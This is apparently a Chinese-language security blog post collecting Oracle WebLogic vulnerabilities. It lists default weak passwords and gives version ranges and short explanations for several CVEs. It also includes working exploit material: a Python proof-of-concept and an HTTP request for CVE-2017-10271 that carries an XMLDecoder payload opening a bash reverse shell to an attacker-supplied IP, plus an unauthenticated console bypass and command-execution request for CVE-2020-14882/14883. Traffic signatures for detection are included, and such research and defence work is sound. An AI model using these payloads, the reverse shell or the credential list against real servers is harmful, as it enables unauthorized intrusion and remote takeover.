+++
title = 'Weblogic 漏洞合集'
date = 2024-05-30T23:20:36+08:00
draft = false
categories = ['漏洞研究']
tags = ['漏洞原理', 'Java', 'Weblogic','框架漏洞']
+++

## 简介

WebLogic是美国 Oracle 公司出品的一个 application server，确切的说是一个基于 JAVAEE 架构的中间件，类似于 apache，tomcat，iis。WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

- 端口：7001
- 后台地址：/console

## 常见弱口令

> 默认密码数据库： <https://cirt.net/passwords?criteria=weblogic>

- system:password
- weblogic:weblogic
- admin:secruity
- joe:password
- mary:password
- system:sercurity
- wlcsystem: wlcsystem
- weblogic:Oracle@123

## XML 反序列化漏洞（CVE-2017-10271）

> <https://blog.csdn.net/yumengzth/article/details/97522783>

### 版本

- 10.3.6.0
- 12.1.3.0.0
- 12.2.1.1.0

### 漏洞说明

CVE-2017-10271 漏洞产生的原因大致是 Weblogic 的 WLS Security 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的 xml 数据甚至能通过反弹 shell 拿到权限。

### POC

```python
import requests

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'text/xml'
    }
def Webogic_XMLDecoder_poc(url):
    #url="http://192.168.189.137:7001"
    posturl=url+'/wls-wsat/CoordinatorPortType'
    data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>xmldecoder_vul_test</string></void><void method="close"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
    '''
     
    print (url)
    try:
        r=requests.post(posturl,data=data,headers=headers,timeout=5)
        geturl=url+"/wls-wsat/test.txt"
        print (geturl)
        check_result = requests.get(geturl,headers=headers,timeout=5)
        if 'xmldecoder_vul_test' in check_result.text:
            print ("[+]存在WebLogic WLS远程执行漏洞(CVE-2017-10271)")
    except:
        print ("[-]不存在WebLogic WLS远程执行漏洞(CVE-2017-10271)")

if __name__ == '__main__':
    url = "http://192.168.189.137:7001"
    Webogic_XMLDecoder_poc(url)
```

### EXP

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
      <java version="1.4.0" class="java.beans.XMLDecoder"> 
        <void class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/bash</string> 
            </void> 
            <void index="1"> 
              <string>-c</string> 
            </void> 
            <void index="2"> 
              <string>bash -i &gt;&amp; /dev/tcp/接收shell的ip/21 0&gt;&amp;1</string> 
            </void> 
          </array> 
          <void method="start"/> 
        </void> 
      </java> 
    </work:WorkContext> 
  </soapenv:Header> 
  <soapenv:Body/> 
</soapenv:Envelope>

```

### 流量特征

危险的 XML 负载，如 `java.beans.XMLDecoder`、`java.lang.ProcessBuilder`、执行的命令等

## T3 反序列化漏洞（CVE-2018-2628）

### 版本

- 10.3.6.0
- 12.1.3.0
- 12.2.1.2
- 12.2.1.3

### 漏洞说明

Weblogic Server WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628），该漏洞通过 [T3 协议](https://www.cnblogs.com/nice0e3/p/14201884.html) 触发，可导致未授权的用户在远程服务器执行任意命令

T3 协议在开放 WebLogic 控制台端口的应用上默认开启. 攻击者可以通过 T3 协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的 weblogic 组件的远程代码执行攻击.
（可通过 nmap 脚本 `–script=weblogic-t3-info` 查看 weblogic 版本信息和 t3 协议是否开启）

### POC

<https://github.com/jas502n/CVE-2018-2628/blob/master/CVE-2018-2628-poc.py>

### EXP

<https://github.com/jas502n/CVE-2018-2628/blob/master/CVE-2018-2628-Getshell.py>

### 流量特征

大规模的序列化负载（长串的二进制数据）

## 任意文件上传漏洞（CVE-2018-2894）

### 版本

- 12.1.3.0
- 12.2.1.2
- 12.2.1.3

### 漏洞说明

Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。

Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。

> [CVE-2018-2894漏洞分析](https://www.freebuf.com/column/205469.html)

### POC & EXP

> <https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2018-2894_poc_exp.py>

### 流量特征

URLs：

- `/ws_utc/config.do`（前端上传页面）
- `/ws_utc/resources/setting/keystore?timestamp=1535682238190`（上传API节点）

## 未授权+命令执行漏洞（CVE-2020-14882,CVE-2020-14883）

> <https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md>

### 版本

- 10.3.6.0.0
- 12.1.3.0.0
- 12.2.1.3.0
- 12.2.1.4.0
- 14.1.1.0.0

### 漏洞说明

CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。

### POC

- 未授权访问

```http
GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29
```

- 命令执行（touch /tmp/123.txt）

```http
POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1
Host: 192.168.19.129:7001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 138

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/123.txt');")
```

### EXP

> <https://github.com/GGyao/CVE-2020-14882_ALL>

### 流量特征

URL：`/console/images/%252E%252E%252Fconsole.portal`

## 参考文章

> [weblogic漏洞复现整理汇总（vulhub）](https://blog.csdn.net/qq_43593134/article/details/119801840)
>
> [Java安全之初探weblogic T3协议漏洞](https://www.cnblogs.com/nice0e3/p/14201884.html)
